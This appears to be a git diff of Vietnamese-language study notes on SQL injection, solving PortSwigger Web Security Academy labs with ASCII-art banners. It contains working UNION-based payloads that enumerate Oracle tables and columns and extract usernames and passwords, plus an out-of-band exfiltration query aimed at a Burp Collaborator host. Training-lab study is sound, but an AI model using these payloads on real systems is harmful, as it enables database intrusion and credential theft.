@@ -17,13 +17,12 @@ Trong trường hợp này, điều kiện '1'='1' luôn đúng, nên điều n�
 
 =======================================================================================================================================================================================================
 
-                                          ___   ___                          
-    / /        // | |     //   ) ) /__  ___/ / /    /|    //| |     //   / / 
-   / /        //__| |    //___/ /    / /    / /    //|   // | |    //____    
-  / /        / ___  |   / __  (     / /    / /    // |  //  | |   / ____     
- / /        //    | |  //    ) )   / /    / /    //  | //   | |  //          
-/ /____/ / //     | | //____/ /   / /  __/ /___ //   |//    | | //____/ /  
-
+ _______ _____  _____ _____ _  __
+|__   __|  __ \|_   _/ ____| |/ /
+   | |  | |__) | | || |    | ' / 
+   | |  |  _  /  | || |    |  <  
+   | |  | | \ \ _| || |____| . \ 
+   |_|  |_|  \_\_____\_____|_|\_\
 
 TRICK : (https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
@@ -141,11 +140,27 @@ You can cause the database to perform a DNS lookup to an external domain contain
         The following technique works on Windows only:
             SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 
+=======================================================================================================================================================================================================
 
 
+ .d8b.  d888888b d888888b  .d8b.   .o88b. db   dD         db    db d88888b  .o88b. d888888b  .d88b.  d8888b. 
+d8' `8b `~~88~~' `~~88~~' d8' `8b d8P  Y8 88 ,8P'         88    88 88'     d8P  Y8 `~~88~~' .8P  Y8. 88  `8D 
+88ooo88    88       88    88ooo88 8P      88,8P           Y8    8P 88ooooo 8P         88    88    88 88oobY' 
+88~~~88    88       88    88~~~88 8b      88`8b           `8b  d8' 88~~~~~ 8b         88    88    88 88`8b   
+88   88    88       88    88   88 Y8b  d8 88 `88.          `8bd8'  88.     Y8b  d8    88    `8b  d8' 88 `88. 
+YP   YP    YP       YP    YP   YP  `Y88P' YP   YD C88888D    YP    Y88888P  `Y88P'    YP     `Y88P'  88   YD 
+
+Xác định kiểu database -> Liệt kê các table -> liệt kê cột trong table cụ thể -> get dữ liệu theo tên cột 
 
 
+=======================================================================================================================================================================================================
 
+                                          ___   ___                          
+    / /        // | |     //   ) ) /__  ___/ / /    /|    //| |     //   / / 
+   / /        //__| |    //___/ /    / /    / /    //|   // | |    //____    
+  / /        / ___  |   / __  (     / /    / /    // |  //  | |   / ____     
+ / /        //    | |  //    ) )   / /    / /    //  | //   | |  //          
+/ /____/ / //     | | //____/ /   / /  __/ /___ //   |//    | | //____/ /  
 
 
 
@@ -205,5 +220,24 @@ Bài 6 : https://portswigger.net/web-security/sql-injection/examining-the-databa
     'UNION+SELECT+table_name,NULL+FROM+all_tables--
         Không nghi ngờ gì nữa Oracle rồi 
         Đáng nhớ ở đây là table_name và all_tables
+    'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+        Cần nhờ all_tab_columns
+        Hiển thị ra các column của table 
+    'UNION+SELECT+USERNAME_HSDRSP,PASSWORD_YMQYCE+FROM+USERS_EIFSPV--
     
-    
+Bài 7 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+    'UNION+SELECT+NULL,NULL,NULL--
+        Bài này basic quá, tìm số lượng cột thì tăng giá trị null lên thôi là ra mà 
+
+Bài 8 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+    %27UNION+SELECT+NULL,%27nkJ8PG%27,NULL--
+        SQL injection bắt in ra giá trị nkJ8PG nên quá là đơn giản 
+
+Bài 9 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+    Giống lab 5 
+
+Bài 10 : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+    '+UNION+SELECT+NULL,'abc'--
+        Xác định có 2 cột trong bảng 
+    '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+        Đang làm đến payload này . lạ quá cần phân tích thêm 
